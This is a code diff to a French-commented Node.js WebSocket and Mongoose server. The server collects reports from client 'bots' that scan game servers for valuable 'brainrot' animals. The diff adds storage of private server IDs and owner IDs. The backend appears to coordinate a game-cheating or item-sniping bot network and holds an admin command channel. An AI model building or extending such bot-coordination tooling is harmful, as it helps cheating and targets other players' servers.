@@ -29,10 +29,12 @@ const ClientSchema = new mongoose.Schema({
 // Servers (Scanning global)
 const ServerSchema = new mongoose.Schema({
     jobId: { type: String, unique: true },
-    scriptUser: String, // Le bot qui a scanné ce serveur
+    privateServerId: String,       // Ajouté
+    privateServerOwnerId: Number, // Ajouté
+    scriptUser: String,
     playerCount: Number,
     maxPlayers: Number,
-    brainrots: Array, // Liste des animaux > 1M
+    brainrots: Array,
     updatedAt: { type: Date, default: Date.now }
 });
 
@@ -118,21 +120,22 @@ wss.on('connection', (ws, req) => {
 
             // 2. Réception des infos du SERVEUR (Animaux riches)
             if (payload.Method === "ServerInfos") {
-                const s = payload.Data;
-                await ServerModel.findOneAndUpdate(
-                    { jobId: s.JobId },
-                    {
-                        scriptUser: s.ScriptUser,
-                        playerCount: s.PlayerCount,
-                        maxPlayers: s.MaxPlayers,
-                        brainrots: s.Brainrots,
-                        updatedAt: new Date()
-                    },
-                    { upsert: true }
-                );
-                console.log(`📊 [SERVER_SCAN] ${s.JobId} mis à jour par ${s.ScriptUser}`);
-                broadcastToAdmins();
-            }
+              const s = payload.Data;
+              await ServerModel.findOneAndUpdate(
+                  { jobId: s.JobId },
+                  {
+                      privateServerId: s.PrivateServerId,
+                      privateServerOwnerId: s.PrivateServerOwnerId,
+                      scriptUser: s.ScriptUser,
+                      playerCount: s.PlayerCount,
+                      maxPlayers: s.MaxPlayers,
+                      brainrots: s.Brainrots,
+                      updatedAt: new Date()
+                  },
+                  { upsert: true }
+              );
+              broadcastToAdmins();
+          }
 
             // 3. Commandes Administrateur
             if (payload.type === "COMMAND") {
